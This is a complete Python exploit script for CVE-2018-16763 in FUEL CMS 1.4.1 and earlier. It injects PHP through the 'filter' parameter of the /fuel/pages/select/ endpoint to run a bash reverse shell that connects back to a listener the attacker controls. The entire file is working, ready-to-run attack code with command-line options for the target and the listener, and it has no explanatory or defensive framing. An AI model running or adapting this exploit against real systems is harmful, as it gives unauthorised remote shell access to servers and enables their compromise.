import requests
import urllib.parse
import argparse

def encode_payload(cmd):
    # Escape the command properly for PHP to avoid parse errors
    payload = f"'+pi(print($a='system'))+$a(\"{cmd}\")+'"
    return urllib.parse.quote(payload)

def send_exploit(target_url, cmd, proxy=None):
    full_url = f"{target_url}/fuel/pages/select/?filter={encode_payload(cmd)}"
    proxies = {"http": proxy} if proxy else None
    try:
        r = requests.get(full_url, proxies=proxies, timeout=10)
        html_tag = "<!DOCTYPE html>"
        end_index = r.text.find(html_tag)
        return r.text[:end_index] if end_index != -1 else r.text
    except Exception as e:
        return f"[!] Request failed: {e}"

def main():
    parser = argparse.ArgumentParser(description="FUEL CMS <= 1.4.1 Reverse Shell Exploit (CVE-2018-16763)")
    parser.add_argument("target", help="Target URL (e.g., http://127.0.0.1:8881)")
    parser.add_argument("lhost", help="Your listener IP (attacker machine)")
    parser.add_argument("lport", help="Your listener port")
    parser.add_argument("-p", "--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    # Reverse shell payload - properly quoted for PHP
    reverse_shell = f"bash -c \\\"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\\\""

    print(f"[+] Sending reverse shell to {args.lhost}:{args.lport} ...")
    output = send_exploit(args.target, reverse_shell, args.proxy)
    print("[+] Exploit sent. Check your listener!")
    print(output)

if __name__ == "__main__":
    main()
